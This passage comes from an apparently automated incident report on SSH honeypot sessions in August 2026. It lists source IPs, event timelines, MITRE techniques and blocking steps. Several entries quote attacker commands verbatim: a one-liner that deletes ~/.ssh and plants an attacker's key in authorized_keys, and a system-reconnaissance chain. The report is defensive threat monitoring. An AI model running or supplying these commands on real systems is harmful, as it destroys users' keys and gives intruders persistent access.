| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:42:41` | `cowrie.session.connect` |
| `2026-08-23 17:42:42` | `cowrie.client.version` |
| `2026-08-23 17:42:42` | `cowrie.client.kex` |
| `2026-08-23 17:42:44` | `cowrie.login.success` |
| `2026-08-23 17:42:45` | `cowrie.direct-tcpip.request` |
| `2026-08-23 17:42:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.200.216[.]246` to AbuseIPDB if not already reported
- [ ] Block `113.200.216[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1aec42578a4

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 17:43 |
| **Last Seen** | 2026-08-23 17:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:43:32` | `cowrie.session.connect` |
| `2026-08-23 17:43:32` | `cowrie.client.version` |
| `2026-08-23 17:43:32` | `cowrie.client.kex` |
| `2026-08-23 17:43:33` | `cowrie.login.success` |
| `2026-08-23 17:43:33` | `cowrie.direct-tcpip.request` |
| `2026-08-23 17:43:33` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 17:43:33` | `cowrie.direct-tcpip.data` |
| `2026-08-23 17:43:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-207f5a49dc58

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 17:43 |
| **Last Seen** | 2026-08-23 17:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:43:35` | `cowrie.session.connect` |
| `2026-08-23 17:43:35` | `cowrie.client.version` |
| `2026-08-23 17:43:36` | `cowrie.client.kex` |
| `2026-08-23 17:43:37` | `cowrie.login.success` |
| `2026-08-23 17:43:37` | `cowrie.direct-tcpip.request` |
| `2026-08-23 17:43:37` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 17:43:37` | `cowrie.direct-tcpip.data` |
| `2026-08-23 17:43:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a227a5ab1f50

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 17:53 |
| **Last Seen** | 2026-08-23 17:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:53:10` | `cowrie.session.connect` |
| `2026-08-23 17:53:10` | `cowrie.client.version` |
| `2026-08-23 17:53:10` | `cowrie.client.kex` |
| `2026-08-23 17:53:11` | `cowrie.login.success` |
| `2026-08-23 17:53:11` | `cowrie.direct-tcpip.request` |
| `2026-08-23 17:53:11` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 17:53:11` | `cowrie.direct-tcpip.data` |
| `2026-08-23 17:53:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3070b3bb7ad

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 17:53 |
| **Last Seen** | 2026-08-23 17:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:53:14` | `cowrie.session.connect` |
| `2026-08-23 17:53:14` | `cowrie.client.version` |
| `2026-08-23 17:53:14` | `cowrie.client.kex` |
| `2026-08-23 17:53:15` | `cowrie.login.success` |
| `2026-08-23 17:53:15` | `cowrie.direct-tcpip.request` |
| `2026-08-23 17:53:15` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 17:53:15` | `cowrie.direct-tcpip.data` |
| `2026-08-23 17:53:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-360b27b4e498

| Field | Detail |
|---|---|
| **Source IP** | `58.229.253[.]119` |
| **First Seen** | 2026-08-23 17:57 |
| **Last Seen** | 2026-08-23 17:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:57:37` | `cowrie.session.connect` |
| `2026-08-23 17:57:37` | `cowrie.client.version` |
| `2026-08-23 17:57:37` | `cowrie.client.kex` |
| `2026-08-23 17:57:38` | `cowrie.login.success` |
| `2026-08-23 17:57:39` | `cowrie.session.params` |
| `2026-08-23 17:57:39` | `cowrie.command.input` |
| `2026-08-23 17:57:39` | `cowrie.command.failed` |
| `2026-08-23 17:57:39` | `cowrie.log.closed` |
| `2026-08-23 17:57:40` | `cowrie.session.params` |
| `2026-08-23 17:57:40` | `cowrie.command.input` |
| `2026-08-23 17:57:40` | `cowrie.session.file_download` |
| `2026-08-23 17:57:40` | `cowrie.log.closed` |
| `2026-08-23 17:57:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.253[.]119` to AbuseIPDB if not already reported
- [ ] Block `58.229.253[.]119` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bad25db885b

| Field | Detail |
|---|---|
| **Source IP** | `58.229.253[.]119` |
| **First Seen** | 2026-08-23 17:57 |
| **Last Seen** | 2026-08-23 17:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:57:40` | `cowrie.session.connect` |
| `2026-08-23 17:57:40` | `cowrie.client.version` |
| `2026-08-23 17:57:40` | `cowrie.client.kex` |
| `2026-08-23 17:57:41` | `cowrie.login.success` |
| `2026-08-23 17:57:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.253[.]119` to AbuseIPDB if not already reported
- [ ] Block `58.229.253[.]119` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf4616cf4725

| Field | Detail |
|---|---|
| **Source IP** | `58.229.253[.]119` |
| **First Seen** | 2026-08-23 17:57 |
| **Last Seen** | 2026-08-23 17:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:57:42` | `cowrie.session.connect` |
| `2026-08-23 17:57:42` | `cowrie.client.version` |
| `2026-08-23 17:57:42` | `cowrie.client.kex` |
| `2026-08-23 17:57:43` | `cowrie.login.success` |
| `2026-08-23 17:57:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.253[.]119` to AbuseIPDB if not already reported
- [ ] Block `58.229.253[.]119` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa964cbacb58

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-23 17:58 |
| **Last Seen** | 2026-08-23 17:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:58:44` | `cowrie.session.connect` |
| `2026-08-23 17:58:44` | `cowrie.client.version` |
| `2026-08-23 17:58:45` | `cowrie.client.kex` |
| `2026-08-23 17:58:45` | `cowrie.login.success` |
| `2026-08-23 17:58:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f53f29f14b93

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-23 17:58 |
| **Last Seen** | 2026-08-23 17:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:58:45` | `cowrie.session.connect` |
| `2026-08-23 17:58:45` | `cowrie.client.version` |
| `2026-08-23 17:58:45` | `cowrie.client.kex` |
| `2026-08-23 17:58:46` | `cowrie.login.success` |
| `2026-08-23 17:58:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be5fd161aacb

| Field | Detail |
|---|---|
| **Source IP** | `152.32.212[.]226` |
| **First Seen** | 2026-08-23 18:00 |
| **Last Seen** | 2026-08-23 18:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:00:26` | `cowrie.session.connect` |
| `2026-08-23 18:00:26` | `cowrie.client.version` |
| `2026-08-23 18:00:26` | `cowrie.client.kex` |
| `2026-08-23 18:00:27` | `cowrie.login.success` |
| `2026-08-23 18:00:28` | `cowrie.session.params` |
| `2026-08-23 18:00:28` | `cowrie.command.input` |
| `2026-08-23 18:00:28` | `cowrie.command.failed` |
| `2026-08-23 18:00:29` | `cowrie.log.closed` |
| `2026-08-23 18:00:30` | `cowrie.session.params` |
| `2026-08-23 18:00:30` | `cowrie.command.input` |
| `2026-08-23 18:00:30` | `cowrie.session.file_download` |
| `2026-08-23 18:00:30` | `cowrie.log.closed` |
| `2026-08-23 18:00:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.212[.]226` to AbuseIPDB if not already reported
- [ ] Block `152.32.212[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5ab6b361648

| Field | Detail |
|---|---|
| **Source IP** | `152.32.212[.]226` |
| **First Seen** | 2026-08-23 18:00 |
| **Last Seen** | 2026-08-23 18:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:00:30` | `cowrie.session.connect` |
| `2026-08-23 18:00:30` | `cowrie.client.version` |
| `2026-08-23 18:00:30` | `cowrie.client.kex` |
| `2026-08-23 18:00:31` | `cowrie.login.success` |
| `2026-08-23 18:00:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.212[.]226` to AbuseIPDB if not already reported
- [ ] Block `152.32.212[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ec7ced551d4

| Field | Detail |
|---|---|
| **Source IP** | `152.32.212[.]226` |
| **First Seen** | 2026-08-23 18:00 |
| **Last Seen** | 2026-08-23 18:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:00:32` | `cowrie.session.connect` |
| `2026-08-23 18:00:32` | `cowrie.client.version` |
| `2026-08-23 18:00:32` | `cowrie.client.kex` |
| `2026-08-23 18:00:33` | `cowrie.login.success` |
| `2026-08-23 18:00:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.212[.]226` to AbuseIPDB if not already reported
- [ ] Block `152.32.212[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3ace7f31e8c

| Field | Detail |
|---|---|
| **Source IP** | `181.87.154[.]121` |
| **First Seen** | 2026-08-23 18:01 |
| **Last Seen** | 2026-08-23 18:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:01:43` | `cowrie.session.connect` |
| `2026-08-23 18:01:44` | `cowrie.client.version` |
| `2026-08-23 18:01:44` | `cowrie.client.kex` |
| `2026-08-23 18:01:46` | `cowrie.login.success` |
| `2026-08-23 18:01:46` | `cowrie.direct-tcpip.request` |
| `2026-08-23 18:01:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.87.154[.]121` to AbuseIPDB if not already reported
- [ ] Block `181.87.154[.]121` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47933840b705

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]231` |
| **First Seen** | 2026-08-23 18:01 |
| **Last Seen** | 2026-08-23 18:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:01:51` | `cowrie.session.connect` |
| `2026-08-23 18:01:52` | `cowrie.client.version` |
| `2026-08-23 18:01:52` | `cowrie.client.kex` |
| `2026-08-23 18:01:54` | `cowrie.login.success` |
| `2026-08-23 18:01:55` | `cowrie.direct-tcpip.request` |
| `2026-08-23 18:02:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]231` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-213b7f1bcc5f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 18:02 |
| **Last Seen** | 2026-08-23 18:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:02:37` | `cowrie.session.connect` |
| `2026-08-23 18:02:37` | `cowrie.client.version` |
| `2026-08-23 18:02:37` | `cowrie.client.kex` |
| `2026-08-23 18:02:38` | `cowrie.login.success` |
| `2026-08-23 18:02:39` | `cowrie.direct-tcpip.request` |
| `2026-08-23 18:02:39` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 18:02:39` | `cowrie.direct-tcpip.data` |
| `2026-08-23 18:02:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efddc260ee4b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 18:02 |
| **Last Seen** | 2026-08-23 18:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:02:41` | `cowrie.session.connect` |
| `2026-08-23 18:02:41` | `cowrie.client.version` |
| `2026-08-23 18:02:41` | `cowrie.client.kex` |
| `2026-08-23 18:02:42` | `cowrie.login.success` |
| `2026-08-23 18:02:42` | `cowrie.direct-tcpip.request` |
| `2026-08-23 18:02:42` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 18:02:42` | `cowrie.direct-tcpip.data` |
| `2026-08-23 18:02:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ead21f075292

| Field | Detail |
|---|---|
| **Source IP** | `120.24.204[.]171` |
| **First Seen** | 2026-08-23 18:02 |
| **Last Seen** | 2026-08-23 18:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:02:51` | `cowrie.session.connect` |
| `2026-08-23 18:02:51` | `cowrie.client.version` |
| `2026-08-23 18:02:51` | `cowrie.client.kex` |
| `2026-08-23 18:02:52` | `cowrie.login.success` |
| `2026-08-23 18:02:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.24.204[.]171` to AbuseIPDB if not already reported
- [ ] Block `120.24.204[.]171` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c83072b4c039

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 18:11 |
| **Last Seen** | 2026-08-23 18:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:11:59` | `cowrie.session.connect` |
| `2026-08-23 18:12:00` | `cowrie.client.version` |
| `2026-08-23 18:12:00` | `cowrie.client.kex` |
| `2026-08-23 18:12:02` | `cowrie.login.success` |
| `2026-08-23 18:12:03` | `cowrie.session.params` |
| `2026-08-23 18:12:03` | `cowrie.command.input` |
| `2026-08-23 18:12:03` | `cowrie.command.input` |
| `2026-08-23 18:12:03` | `cowrie.command.input` |
| `2026-08-23 18:12:03` | `cowrie.command.input` |
| `2026-08-23 18:12:03` | `cowrie.command.input` |
| `2026-08-23 18:12:03` | `cowrie.command.success` |
| `2026-08-23 18:12:03` | `cowrie.command.input` |
| `2026-08-23 18:12:03` | `cowrie.command.input` |
| `2026-08-23 18:12:03` | `cowrie.command.input` |
| `2026-08-23 18:12:03` | `cowrie.command.input` |
| `2026-08-23 18:12:04` | `cowrie.log.closed` |
| `2026-08-23 18:12:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da01e0e50c5d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 18:12 |
| **Last Seen** | 2026-08-23 18:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:12:39` | `cowrie.session.connect` |
| `2026-08-23 18:12:39` | `cowrie.client.version` |
| `2026-08-23 18:12:39` | `cowrie.client.kex` |
| `2026-08-23 18:12:40` | `cowrie.login.success` |
| `2026-08-23 18:12:40` | `cowrie.direct-tcpip.request` |
| `2026-08-23 18:12:40` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 18:12:40` | `cowrie.direct-tcpip.data` |
| `2026-08-23 18:12:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7f2b5eb3942

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 18:12 |
| **Last Seen** | 2026-08-23 18:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:12:43` | `cowrie.session.connect` |
| `2026-08-23 18:12:43` | `cowrie.client.version` |
| `2026-08-23 18:12:43` | `cowrie.client.kex` |
| `2026-08-23 18:12:44` | `cowrie.login.success` |
| `2026-08-23 18:12:44` | `cowrie.direct-tcpip.request` |
| `2026-08-23 18:12:44` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 18:12:44` | `cowrie.direct-tcpip.data` |
| `2026-08-23 18:12:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a86473f41bd

| Field | Detail |
|---|---|
| **Source IP** | `117.32.132[.]170` |
| **First Seen** | 2026-08-23 18:12 |
| **Last Seen** | 2026-08-23 18:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:12:55` | `cowrie.session.connect` |
| `2026-08-23 18:12:56` | `cowrie.client.version` |
| `2026-08-23 18:12:56` | `cowrie.client.kex` |
| `2026-08-23 18:12:58` | `cowrie.login.success` |
| `2026-08-23 18:12:59` | `cowrie.direct-tcpip.request` |
| `2026-08-23 18:13:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.32.132[.]170` to AbuseIPDB if not already reported
- [ ] Block `117.32.132[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-440fe07f9ec0

| Field | Detail |
|---|---|
| **Source IP** | `179.184.85[.]167` |
| **First Seen** | 2026-08-23 18:13 |
| **Last Seen** | 2026-08-23 18:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:13:04` | `cowrie.session.connect` |
| `2026-08-23 18:13:04` | `cowrie.client.version` |
| `2026-08-23 18:13:04` | `cowrie.client.kex` |
| `2026-08-23 18:13:06` | `cowrie.login.success` |
| `2026-08-23 18:13:07` | `cowrie.direct-tcpip.request` |
| `2026-08-23 18:13:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.85[.]167` to AbuseIPDB if not already reported
- [ ] Block `179.184.85[.]167` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f393faf79f91

